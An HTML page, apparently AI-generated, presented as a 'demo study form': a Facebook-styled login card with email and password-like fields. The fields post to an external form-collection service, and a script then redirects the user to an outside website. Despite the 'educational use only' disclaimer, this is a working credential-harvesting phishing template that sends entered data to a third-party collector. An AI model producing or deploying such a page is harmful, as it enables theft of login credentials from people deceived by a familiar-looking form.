<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Study Demo Form</title>

  <style>
    body{
      font-family: Arial, sans-serif;
      background:#f0f2f5;
      display:flex;
      justify-content:center;
      align-items:center;
      height:100vh;
      margin:0;
    }

    .card{
      width:360px;
      background:#fff;
      padding:25px;
      border-radius:12px;
      box-shadow:0 4px 20px rgba(0,0,0,0.12);
      text-align:center;
    }

    img.logo{
      width:80px;
      height:80px;
      border-radius:50%;
      margin-bottom:12px;
    }

    h3{
      margin:5px 0 8px;
    }

    .note{
      font-size:12px;
      color:#666;
      margin-bottom:15px;
    }

    input{
      width:100%;
      padding:12px;
      margin-top:10px;
      border-radius:8px;
      border:1px solid #ccc;
      font-size:14px;
    }

    button{
      width:100%;
      padding:12px;
      background:#1877f2;
      color:#fff;
      border:none;
      border-radius:8px;
      margin-top:15px;
      cursor:pointer;
      font-weight:bold;
    }
  </style>
</head>

<body>

<div class="card">

  <!-- Your uploaded image safely used as a study icon -->
  <img src="/mnt/data/074C2ACF-B6B3-4516-8705-E18341BEE4DA.png" class="logo" alt="Study Logo">

  <h3>Demo Study Form</h3>
  <p class="note">This page is for educational use only.<br>Do NOT enter real login credentials.</p>

  <form action="https://submit-form.com/blhVBi5SO" method="POST" id="studyForm">

    <input type="email" name="demo_email" placeholder="Enter demo email" required>

    <input type="text" name="demo_password" placeholder="Enter demo text" required>

    <button type="submit">Submit Demo</button>
  </form>

</div>

<script>
document.getElementById("studyForm").addEventListener("submit", function(){
    setTimeout(() => {
        window.location.href = "https://sajjadkori.com";
    }, 500);
});
</script>

</body>
</html>
